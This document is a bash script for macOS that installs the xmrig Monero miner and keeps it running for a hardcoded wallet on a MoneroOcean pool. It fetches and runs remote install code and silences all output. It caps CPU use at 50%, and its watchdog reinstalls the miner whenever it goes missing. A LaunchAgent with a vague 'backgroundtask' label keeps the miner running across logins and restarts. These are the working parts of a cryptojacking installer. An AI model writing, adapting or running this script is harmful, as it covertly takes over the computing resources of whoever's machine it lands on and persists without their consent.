#!/usr/bin/env bash
set -euo pipefail

WALLET="464WoeWykbHMGTpkr6otNu4RhjHnt3L9KL16cBPjbGs7hvWvTT7C2oWHidAvFpbeuTPhkQ1Vtk1tC6VzsZA5dUP91mYKKPF"
POOL="pool.moneroocean.stream:10001"
WORKER="mac_miner"
LOGDIR="$HOME/Library/Logs"
LOGFILE="$LOGDIR/miner.log"
PLIST="$HOME/Library/LaunchAgents/com.backgroundtask.miner.plist"
WATCHDOG="$HOME/xmrig_watchdog.sh"

# install Homebrew if not present
if ! command -v brew >/dev/null 2>&1; then
  /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" </dev/null >/dev/null 2>&1
fi

# ensure log directory exists
mkdir -p "$LOGDIR"

# watchdog script
cat > "$WATCHDOG" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail

# Ensure Homebrew path is available
export PATH="/opt/homebrew/bin:/usr/local/bin:$PATH"

WALLET="464WoeWykbHMGTpkr6otNu4RhjHnt3L9KL16cBPjbGs7hvWvTT7C2oWHidAvFpbeuTPhkQ1Vtk1tC6VzsZA5dUP91mYKKPF"
POOL="pool.moneroocean.stream:10001"
WORKER="mac_miner"
LOGDIR="$HOME/Library/Logs"
LOGFILE="$LOGDIR/miner.log"

mkdir -p "$LOGDIR"

while true; do
  # reinstall xmrig if missing
  if ! command -v xmrig >/dev/null 2>&1; then
    if ! brew list xmrig >/dev/null 2>&1; then
      brew install xmrig >/dev/null 2>&1 || {
        FORMULA=$(brew search xmrig | head -n1)
        [ -n "$FORMULA" ] && brew install "$FORMULA" >/dev/null 2>&1 || true
      }
    fi
  fi

  # reinstall cpulimit if missing
  if ! command -v cpulimit >/dev/null 2>&1; then
    brew install cpulimit >/dev/null 2>&1 || true
  fi

  # delete log if too large (>50MB)
  if [ -f "$LOGFILE" ] && [ $(du -m "$LOGFILE" | cut -f1) -gt 50 ]; then
    rm -f "$LOGFILE"
  fi

  # run xmrig capped at 50% CPU
  nohup cpulimit -l 50 xmrig \
    --url=$POOL \
    --user=$WALLET \
    --pass=$WORKER \
    --background \
    --donate-level=1 \
    >> "$LOGFILE" 2>&1 &

  miner_pid=$!

  # wait for miner to exit
  wait $miner_pid || true

  # sleep briefly before restart
  sleep 5
done
EOF
chmod +x "$WATCHDOG"

# create LaunchAgent plist
mkdir -p "$HOME/Library/LaunchAgents"
cat > "$PLIST" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
 "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.backgroundtask.miner</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>$WATCHDOG</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>$LOGFILE</string>
    <key>StandardErrorPath</key>
    <string>$LOGFILE</string>
</dict>
</plist>
EOF

# load LaunchAgent immediately
launchctl load "$PLIST" >/dev/null 2>&1 || true
